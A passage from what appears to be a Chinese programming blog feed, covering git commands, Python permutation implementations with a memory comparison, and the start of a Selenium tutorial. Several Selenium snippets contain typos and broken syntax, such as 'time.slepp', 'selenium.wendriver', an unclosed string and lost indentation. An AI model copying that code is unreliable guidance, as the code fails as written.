class="comment"># 显示两次提交之间的差异</span></span><br><span class="line">$ git diff [first-branch]...[second-branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示今天你写了多少行代码</span></span><br><span class="line">$ git diff --shortstat <span class="string">"@&#123;0 day ago&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某次提交的元数据和内容变化</span></span><br><span class="line">$ git show [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某次提交发生变化的文件</span></span><br><span class="line">$ git show --name-only [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某次提交时，某个文件的内容</span></span><br><span class="line">$ git show [commit]:[filename]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示当前分支的最近几次提交</span></span><br><span class="line">$ git reflog</span><br></pre></td></tr></table></figure><h2 id="远程同步"><a href="#远程同步" class="headerlink" title="远程同步"></a>远程同步</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载远程仓库的所有变动</span></span><br><span class="line">$ git fetch [remote]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示所有远程仓库</span></span><br><span class="line">$ git remote -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某个远程仓库的信息</span></span><br><span class="line">$ git remote show [remote]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加一个新的远程仓库，并命名</span></span><br><span class="line">$ git remote add [shortname] [url]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取回远程仓库的变化，并与本地分支合并</span></span><br><span class="line">$ git pull [remote] [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传本地指定分支到远程仓库</span></span><br><span class="line">$ git push [remote] [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强行推送当前分支到远程仓库，即使有冲突</span></span><br><span class="line">$ git push [remote] --force</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送所有分支到远程仓库</span></span><br><span class="line">$ git push [remote] --all</span><br></pre></td></tr></table></figure><h2 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a>撤销</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 恢复暂存区的指定文件到工作区</span></span><br><span class="line">$ git checkout [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复某个commit的指定文件到暂存区和工作区</span></span><br><span class="line">$ git checkout [commit] [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复暂存区的所有文件到工作区</span></span><br><span class="line">$ git checkout .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变</span></span><br><span class="line">$ git reset [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重置暂存区与工作区，与上一次commit保持一致</span></span><br><span class="line">$ git reset --hard</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变</span></span><br><span class="line">$ git reset [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致</span></span><br><span class="line">$ git reset --hard [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重置当前HEAD为指定commit，但保持暂存区和工作区不变</span></span><br><span class="line">$ git reset --keep [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个commit，用来撤销指定commit</span></span><br><span class="line"><span class="comment"># 后者的所有变化都将被前者抵消，并且应用到当前分支</span></span><br><span class="line">$ git revert [commit]</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python实现全排列</title>
      <link href="/python%E5%AE%9E%E7%8E%B0%E5%85%A8%E6%8E%92%E5%88%97.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">要靠别人的错误繁荣自己。</blockquote><p><img src="https://ask.qcloudimg.com/http-save/yehe-1388365/agadexp68n.png?imageView2/0/w/1620" alt=""></p><a id="more"></a><h2 id="全排列"><a href="#全排列" class="headerlink" title="全排列"></a>全排列</h2><h3 id="不在原列表上操作"><a href="#不在原列表上操作" class="headerlink" title="不在原列表上操作"></a>不在原列表上操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-04-03 20:39:49</span></span><br><span class="line"><span class="comment"># @Author  : longofo</span></span><br><span class="line"><span class="comment"># @Email   : </span></span><br><span class="line"><span class="comment"># @Link    : http://longofo.cc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span><span class="params">(lst)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(id(lst))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(lst) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">yield</span> lst <span class="keyword">if</span> lst <span class="keyword">else</span> []</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> index, _ <span class="keyword">in</span> enumerate(lst):</span><br><span class="line">            <span class="keyword">for</span> per <span class="keyword">in</span> permutation(lst[<span class="number">0</span>:index] + lst[index + <span class="number">1</span>:]):</span><br><span class="line">                <span class="keyword">yield</span> list(lst[index]) + per</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst = list(<span class="string">'abc'</span>)</span><br><span class="line">    <span class="keyword">for</span> per_lst <span class="keyword">in</span> permutation(lst):</span><br><span class="line">        print(<span class="string">' '</span>.join(per_lst))</span><br><span class="line">        <span class="comment"># pass</span></span><br></pre></td></tr></table></figure><p>测试结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a b c</span><br><span class="line">a c b</span><br><span class="line">b a c</span><br><span class="line">b c a</span><br><span class="line">c a b</span><br><span class="line">c b a</span><br><span class="line">[Finished in 0.1s]</span><br></pre></td></tr></table></figure></p><h3 id="在原列表上操作（执行交换）"><a href="#在原列表上操作（执行交换）" class="headerlink" title="在原列表上操作（执行交换）"></a>在原列表上操作（执行交换）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-04-03 17:59:56</span></span><br><span class="line"><span class="comment"># @Author  : longofo</span></span><br><span class="line"><span class="comment"># @Email   : </span></span><br><span class="line"><span class="comment"># @Link    : http://longofo.cc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span><span class="params">(lst, start, length)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(id(lst))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (start == length):</span><br><span class="line">        print(<span class="string">' '</span>.join(lst))</span><br><span class="line">        <span class="comment"># pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(start, length):</span><br><span class="line">        lst[start], lst[index] = lst[index], lst[start]</span><br><span class="line">        permutation(lst, start + <span class="number">1</span>, length)</span><br><span class="line">        lst[start], lst[index] = lst[index], lst[start]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst = list(<span class="string">'abc'</span>)</span><br><span class="line">    permutation(lst, <span class="number">0</span>, len(lst))</span><br></pre></td></tr></table></figure><p>测试结果:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a b c</span><br><span class="line">a c b</span><br><span class="line">b a c</span><br><span class="line">b c a</span><br><span class="line">c b a</span><br><span class="line">c a b</span><br><span class="line">[Finished <span class="keyword">in</span> <span class="number">0.1</span>s]</span><br></pre></td></tr></table></figure></p><h3 id="py大法"><a href="#py大法" class="headerlink" title="py大法"></a>py大法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-04-03 20:39:49</span></span><br><span class="line"><span class="comment"># @Author  : longofo</span></span><br><span class="line"><span class="comment"># @Email   : </span></span><br><span class="line"><span class="comment"># @Link    : http://longofo.cc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span><span class="params">(lst)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> per <span class="keyword">in</span> itertools.permutations(lst, len(lst)):</span><br><span class="line">        print(<span class="string">' '</span>.join(per))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst = list(<span class="string">'abc'</span>)</span><br><span class="line">    permutation(lst)</span><br></pre></td></tr></table></figure><p>运行结果：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a b c</span><br><span class="line">a c b</span><br><span class="line">b a c</span><br><span class="line">b c a</span><br><span class="line">c a b</span><br><span class="line">c b a</span><br><span class="line">[Finished <span class="keyword">in</span> <span class="number">0.1</span>s]</span><br></pre></td></tr></table></figure></p><h3 id="对比分析"><a href="#对比分析" class="headerlink" title="对比分析"></a>对比分析</h3><p>py大法就不用说了，肯定是经过了各种优化</p><p>这里看下前两种方式每次lst的id号:</p><ul><li><p>第一种：</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-04-03 20:39:49</span></span><br><span class="line"><span class="comment"># @Author  : longofo</span></span><br><span class="line"><span class="comment"># @Email   : </span></span><br><span class="line"><span class="comment"># @Link    : http://longofo.cc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span><span class="params">(lst)</span>:</span></span><br><span class="line"></span><br><span class="line">    print(id(lst))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(lst) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">yield</span> lst <span class="keyword">if</span> lst <span class="keyword">else</span> []</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> index, _ <span class="keyword">in</span> enumerate(lst):</span><br><span class="line">            <span class="keyword">for</span> per <span class="keyword">in</span> permutation(lst[<span class="number">0</span>:index] + lst[index + <span class="number">1</span>:]):</span><br><span class="line">                <span class="keyword">yield</span> list(lst[index]) + per</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst = list(<span class="string">'abc'</span>)</span><br><span class="line">    <span class="keyword">for</span> per_lst <span class="keyword">in</span> permutation(lst):</span><br><span class="line">        <span class="comment"># print(' '.join(per_lst))</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>  结果:</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2743162906952</span></span><br><span class="line"><span class="number">2743162962696</span></span><br><span class="line"><span class="number">2743162962760</span></span><br><span class="line"><span class="number">2743162962824</span></span><br><span class="line"><span class="number">2743162905672</span></span><br><span class="line"><span class="number">2743162904840</span></span><br><span class="line"><span class="number">2743162905544</span></span><br><span class="line"><span class="number">2743162962760</span></span><br><span class="line"><span class="number">2743162968776</span></span><br><span class="line"><span class="number">2743162968840</span></span><br><span class="line">[Finished <span class="keyword">in</span> <span class="number">0.3</span>s]</span><br></pre></td></tr></table></figure></li><li><p>第二种方式:</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-04-03 17:59:56</span></span><br><span class="line"><span class="comment"># @Author  : longofo</span></span><br><span class="line"><span class="comment"># @Email   : </span></span><br><span class="line"><span class="comment"># @Link    : http://longofo.cc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span><span class="params">(lst, start, length)</span>:</span></span><br><span class="line"></span><br><span class="line">    print(id(lst))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (start == length):</span><br><span class="line">        <span class="comment"># print(' '.join(lst))</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(start, length):</span><br><span class="line">        lst[start], lst[index] = lst[index], lst[start]</span><br><span class="line">        permutation(lst, start + <span class="number">1</span>, length)</span><br><span class="line">        lst[start], lst[index] = lst[index], lst[start]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst = list(<span class="string">'abc'</span>)</span><br><span class="line">    permutation(lst, <span class="number">0</span>, len(lst))</span><br></pre></td></tr></table></figure><p>  结果:</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1574917631432</span></span><br><span class="line"><span class="number">1574917631432</span></span><br><span class="line"><span class="number">1574917631432</span></span><br><span class="line"><span class="number">1574917631432</span></span><br><span class="line"><span class="number">1574917631432</span></span><br><span class="line"><span class="number">1574917631432</span></span><br><span class="line"><span class="number">1574917631432</span></span><br><span class="line"><span class="number">1574917631432</span></span><br><span class="line"><span class="number">1574917631432</span></span><br><span class="line"><span class="number">1574917631432</span></span><br><span class="line"><span class="number">1574917631432</span></span><br><span class="line"><span class="number">1574917631432</span></span><br><span class="line"><span class="number">1574917631432</span></span><br><span class="line"><span class="number">1574917631432</span></span><br><span class="line"><span class="number">1574917631432</span></span><br><span class="line"><span class="number">1574917631432</span></span><br><span class="line">[Finished <span class="keyword">in</span> <span class="number">0.1</span>s]</span><br></pre></td></tr></table></figure></li></ul><p>可以看到用第一种方式时每次都产生了新对象，栈上需要额外的空间来保存这些对象，而第二种只有最初的那个对象。所以当排列的列表很大时，第一种方式是不合适的。</p>]]></content>
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python selenium的基本使用</title>
      <link href="/python%20selenium%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">在比夜更深的地方，一定有比夜更黑的眼睛！</blockquote><p><img src="https://i.ytimg.com/vi/m6iqdzITwmg/hqdefault.jpg" alt=""></p><a id="more"></a><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>pip安装selenium：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install selenium</span><br></pre></td></tr></table></figure></p><p>安装对应的驱动<a href="http://selenium-python.readthedocs.io/installation.html#downloading-python-bindings-for-selenium" target="_blank" rel="noopener">点这里</a>（下面将使用chrome为例，使用的是chromedriver，注意浏览器版本和driver要对应，不然使用是会出错）</p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By <span class="comment"># 选择器，ID，CSS，XPATH等</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys </span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC <span class="comment"># 条件</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait <span class="comment"># 等待：显示等待和隐式等待</span></span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">wait = WebDriverWait(browser,<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">browser.get(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line">inputs = browser.find_element_by_id(<span class="string">'kw'</span>)</span><br><span class="line">inputs.send_keys(<span class="string">'Python'</span>)</span><br><span class="line">inputs.send_keys(Keys.ENTER)</span><br><span class="line"></span><br><span class="line">wait.until(EC.presence_of_element_located((By.ID,<span class="string">'content_left'</span>)))</span><br><span class="line"></span><br><span class="line">print(browser.current_url)</span><br><span class="line">print(browser.get_cookies)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'D:/Desktop/test.html'</span>,<span class="string">'w'</span>,encoding=<span class="string">'utf8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(browser.page_source)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(e.args)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure><h3 id="申明浏览器对象"><a href="#申明浏览器对象" class="headerlink" title="申明浏览器对象"></a>申明浏览器对象</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser = webdriver.Edge()</span><br><span class="line">browser = webdriver.Phatomjs()</span><br></pre></td></tr></table></figure><h3 id="访问页面"><a href="#访问页面" class="headerlink" title="访问页面"></a>访问页面</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">browser.get(<span class="string">'http://www.baidu.com)</span></span><br><span class="line"><span class="string">print(browser.page_source)</span></span><br></pre></td></tr></table></figure><h3 id="查找元素"><a href="#查找元素" class="headerlink" title="查找元素"></a>查找元素</h3><p>单个元素:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">input_first = browser.find_element_by_id(<span class="string">'q'</span>)</span><br><span class="line">input_second = browser.find_element_css_selector(<span class="string">'#q'</span>)</span><br><span class="line">input_thrid = browser.find_element_by_xpath(<span class="string">'//*[@id="q"]'</span>)</span><br><span class="line">print(input_first,input_second,input_thrid)</span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure></p><p>也可以:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.wendriver.commom.by <span class="keyword">import</span> By</span><br><span class="line"></span><br><span class="line">input_first = browser.find_element(By.ID,<span class="string">'q'</span>)</span><br></pre></td></tr></table></figure></p><p>多个元素:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lis = browser.find_elements_by_CSS_selector(<span class="string">'.service-db li'</span>)</span><br><span class="line">lis1 = browser.find_elements(By.CSS_SELECTOR,<span class="string">'.service-db li'</span>)</span><br></pre></td></tr></table></figure></p><p>其他方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find_elements_by_name()</span><br><span class="line">find_elements_by_link_text()</span><br><span class="line">find_elements_by_partail_link_text()</span><br><span class="line">find_elements_by_tag_name()</span><br><span class="line">find_elements_by_class_name()</span><br><span class="line">find_elements_by_css_selector()</span><br><span class="line">find_elements_by_xpath()</span><br></pre></td></tr></table></figure></p><h3 id="元素交互操作-对获取到的按钮、文本框操作-："><a href="#元素交互操作-对获取到的按钮、文本框操作-：" class="headerlink" title="元素交互操作(对获取到的按钮、文本框操作)："></a>元素交互操作(对获取到的按钮、文本框操作)：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">input = browser.find_element_by_id(<span class="string">'q'</span>)</span><br><span class="line">input_send_keys(<span class="string">'iPhone'</span>)</span><br><span class="line">time.slepp(<span class="number">1</span>)</span><br><span class="line">input.clear()</span><br><span class="line">input.send_keys(<span class="string">'iPad'</span>)</span><br><span class="line">button = browser.find_element_by_class_name(<span class="string">'btn-search'</span>)</span><br><span class="line">button.click()</span><br></pre></td></tr></table></figure><h3 id="交互动作-将动作附加到动作链中串行执行"><a href="#交互动作-将动作附加到动作链中串行执行" class="headerlink" title="交互动作(将动作附加到动作链中串行执行):"></a>交互动作(将动作附加到动作链中串行执行):</h3><p>演示拖拽：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.wendriver <span class="keyword">import</span> ActionChains</span><br><span class="line"></span><br><span class="line">source = browser.switch_to.frame(<span class="string">'iframeResult'</span>)</span><br><span class="line">source = browser.find_element_by_css_selector(<span class="string">'#draggable'</span>)</span><br><span class="line">target = browser.find_element_by_css_selector(<span class="string">'#droppable'</span>)</span><br><span class="line">actions = ActionChains(browser)</span><br><span class="line">actions.drag_and_drop(source,target)</span><br><span class="line">actions.perform()</span><br></pre></td></tr></table></figure></p><p>ActionChains方法列表:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">click(on_element=<span class="keyword">None</span>) ——单击鼠标左键 </span><br><span class="line">click_and_hold(on_element=<span class="keyword">None</span>) ——点击鼠标左键，不松开 </span><br><span class="line">context_click(on_element=<span class="keyword">None</span>) ——点击鼠标右键 </span><br><span class="line">double_click(on_element=<span class="keyword">None</span>) ——双击鼠标左键</span><br><span class="line">drag_and_drop(source, target) ——拖拽到某个元素然后松开 </span><br><span class="line">drag_and_drop_by_offset(source, xoffset, yoffset) ——拖拽到某个坐标然后松开</span><br><span class="line">key_down(value, element=<span class="keyword">None</span>) ——按下某个键盘上的键</span><br><span class="line">key_up(value, element=<span class="keyword">None</span>) ——松开某个键</span><br><span class="line">move_by_offset(xoffset, yoffset) ——鼠标从当前位置移动到某个坐标</span><br><span class="line">move_to_element(to_element) ——鼠标移动到某个元素 </span><br><span class="line">move_to_element_with_offset(to_element, xoffset, yoffset) ——移动到距某个元素（左上角坐标）多少 距离的位置</span><br><span class="line">perform() ——执行链中的所有动作 </span><br><span class="line">release(on_element=<span class="keyword">None</span>) ——在某个元素位置松开鼠标左键 </span><br><span 